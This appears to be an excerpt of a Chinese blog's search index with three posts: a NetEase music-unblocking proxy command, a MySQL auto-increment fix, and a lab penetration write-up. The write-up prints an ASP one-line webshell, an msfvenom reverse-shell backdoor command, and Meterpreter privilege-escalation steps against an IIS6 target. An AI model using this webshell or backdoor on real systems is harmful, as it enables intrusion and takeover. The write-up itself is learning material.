<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pm2 start app.js --name UnblockNeteaseMusic -- -s -p 8080 -e https://你的域名</span><br></pre></td></tr></table></figure>

<p> 指定了 -e 参数之后，请求会交由默认的 443 的 HTTPS 进行包裹并反向代理回该项目，保证你的 IOS 设备成功获取。 </p>
]]></content>
      <categories>
        <category>雕虫小技</category>
      </categories>
      <tags>
        <tag>雕虫小技</tag>
        <tag>破解网易云</tag>
      </tags>
  </entry>
  <entry>
    <title>解决MySQL主键自增不连续问题</title>
    <url>/2020/04/04/%E8%A7%A3%E5%86%B3MySQL%E4%B8%BB%E9%94%AE%E8%87%AA%E5%A2%9E%E4%B8%8D%E8%BF%9E%E7%BB%AD%E9%97%AE%E9%A2%98/</url>
    <content><![CDATA[<script type="text/javascript" src="/js/src/bai.js"></script>
<p>今天爬取数据录入数据库发现一个问题，如果sql语句执行错误以后，主键id会不连续。</p>
<p>具体原因百度很多。总之是，为了保证是自增的，就不能保证它是否连续。</p>
<p>解决方法：</p>
<p>每次插入前,先设置auto_increment=1<br>也就是运行两条命令完成正确操作 </p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> Qinghua AUTO_INCREMENT<span class="operator">=</span><span class="number">1</span>;</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Qinghua(qinghua) <span class="keyword">VALUES</span> (<span class="operator">%</span>s)</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
        <tag>主键自增不连续</tag>
      </tags>
  </entry>
  <entry>
    <title>记一道kali渗透</title>
    <url>/2019/01/19/%E8%AE%B0%E4%B8%80%E9%81%93kali%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<p>师哥第一次给出靶机渗透测试，初次尝试内容较菜~</p>
<p>首先浏览器访问ip（windows的ie浏览器是垃圾，需要谷歌浏览器访问）<br><img src="https://i.loli.net/2020/01/19/hcHbEIlfapFgzV4.png" alt="浏览器访问"></p>
<p>iis是windows自带的web服务，这里提示了漏洞是iis6和webdav</p>
<p>iis6有一个文件上传漏洞，首先是通过一个专门针对这个漏动的软件进行上传木马–iiswrite（桂林老兵出品）。之后我打算上传一个一句话木马然后通过中国菜刀连接，当然也直接可以直接上传一个大马进行操作，总之为了获得简单的webshell。<br>先用.txt写一句话木马，我这里写的asp的，另外还有php啥的。&lt;%eval request (“gg”)%&gt;（gg类似一个口令，可以自己定义，菜刀内需要填写）。</p>
<p>用iiswrite上传：<br><img src="https://i.loli.net/2020/01/19/WKHkhJzL6Ucyemn.png" alt="iiswrite0"><br>现用put提交.txt的一句话木马<br><img src="https://i.loli.net/2020/01/19/N3pEScVhqJATHRQ.png" alt="iiswrite1"><br>再用move将其转化为asp</p>
<p>菜刀添加<br><img src="https://i.loli.net/2020/01/19/RVXUxDshE1aSBLz.png" alt="中国菜刀"></p>
<p>打开文件管理，上传一个cmd1.exe到一个可上传文件的地方（有的地方没权限，上传不了文件），打开虚拟终端进行cmd提权：<br>在虚拟终端打入命令help<br>然后会告诉你更改终端路径的命令（step c：.………….）,将物理路径社为刚刚上传的cmd.exe的路径<br>输入命令whoami，查看自己的权限，权限较低。</p>
<p>打开kali，用msf进一步提权：<br>先生成一个后门</p>
<pre><code class="Shell">msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b &#39;\x00&#39; LHOST=192.168.186.134 LPORT=4444 -f exe &gt; yu.exe
</code></pre>
<p><img src="https://i.loli.net/2020/01/19/COWN43UzJefxpoB.png" alt="msf0"><br>生成的文件在Home<br><img src="https://i.loli.net/2020/01/19/kJwVI7yQhPcdE1g.png" alt="msf1"><br>打开监听，选择荷载作为攻击，设置IP和端口（LHOST是监听者的ip，listener）<br>然后在菜刀的虚拟终端运行那个后门     start  c：.…..<br>然后在执行我们的后门，可以看见MSF弹回了一个session 1(会话连接)。<br>说明我们后门程序成功执行起来了，当然你也可以在webshell执行的，<br>但必须的有一点执行的权限。</p>
<p>然后输入getuid发现此时的权限和菜刀里的一样低<br>下一步我们要进行esp的漏洞模块提权了，先输入命令background（把你当前的metasploit shell转为后台执行）</p>
<p>接下来就是选择合适的漏洞模块进行提权<br><img src="https://i.loli.net/2020/01/19/smHjTwci9VSEK5A.png" alt="msf2"><br>因为靶机中大部分文件的更改时间是2014年，于是搜索的14年的漏洞（ms是微软的意思，14是年份，关键词搜索）<br>之后我在微软的官方漏洞公布的网站上挨着看漏洞的介绍，找找有没有合适的：<br><img src="https://i.loli.net/2020/01/19/fXFOYv53MQtywKr.png" alt="ms漏洞公告"><br>（“此安全更新可解决 Microsoft Windows 中一个公开披露的漏洞。此漏洞在攻击者登录系统并运行特制应用程序时允许提升特权。攻击者必须拥有有效的登录凭据并能本地登录才能利用此漏洞。对于 Windows Server 2003 的所有受支持版本，此安全更新的等级为“重要”。”）</p>
<p>每个漏洞模块具体提权方式有差异，而且针对不同的系统，还牵扯到靶机打的补丁情况，这里也只能算是猜的。。。。<br><img src="https://i.loli.net/2020/01/19/aF7WpCw8E4ZKxBu.png" alt="msf3"><br><img src="https://i.loli.net/2020/01/19/HL3fdVc1sT7Qljr.png" alt="msf4"><br><img src="https://i.loli.net/2020/01/19/LljEUWGgScR4OBy.png" alt="msf5"><br><img src="https://i.loli.net/2020/01/19/ow4kscOKzi5yFRa.png" alt="msf6"><br>一堆进程<br><img src="https://i.loli.net/2020/01/19/Enk1HABVm79h6Mb.png" alt="msf7"><br><img src="https://i.loli.net/2020/01/19/rXkq3Mb5h8LOGVA.png" alt="msf8"><br>大体解释一下<br>use #利用的模块名称<br>show options #查看需要输入的信息（这两个都只是需要设置SESSION就行了）<br>set …… #设置相关项<br>getuid#查看自己权限<br>ps#查看当前进程，如果提权成功，他会出现system的进程，然而这里出现了很多<br>migrate#将当前进程迁移到一个system的进程（数字是他的PID）<br>shell#提权<br>然后建立用户，将其加入管理员组，然后开放3389端口，连接远程桌面#百度有详细的步骤</p>
<p>PS：kali中的Msfconsole:<br>Msfconsole提供了一个一体化的集中控制台。通过msfconsole，你可以访问和使用所有的metasploit的插件，payload，利用模块，post模块等等。Msfconsole还有第三方程序的接口，比如nmap，sqlmap等，可以直接在msfconsole里面使用。</p>
<p>通常情况下应该先进行端口扫描：<br>使用nmap进行端口扫描，<br>通常使用nmap-SV IP(或者域名)，如果机器设置有防火墙禁ping，可以使用nmap -P0(或者-Pn)-sV IP(或者域名)<br>查看主机端口开发情况<br>另外也可以用windos上的nmap扫描</p>
<p>当用菜刀得到一个cmd权限的时候可以用Systeminfo命令获取计算机信息<br><img src="https://i.loli.net/2020/01/19/OtHKc3xQ2zyIevq.png" alt="计算机信息"><br>需要看看靶机打了什么补丁，因为打了相应的补丁后对应的漏洞模块不起作用。</p>
<p>然后用Tasklist /svc 进程获取命令来看看有没有杀毒软件</p>
<p>因为改靶机没有waf，后门木马不需要做免杀。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>kali</tag>
        <tag>实战渗透</tag>
      </tags>
  </entry>
</search>
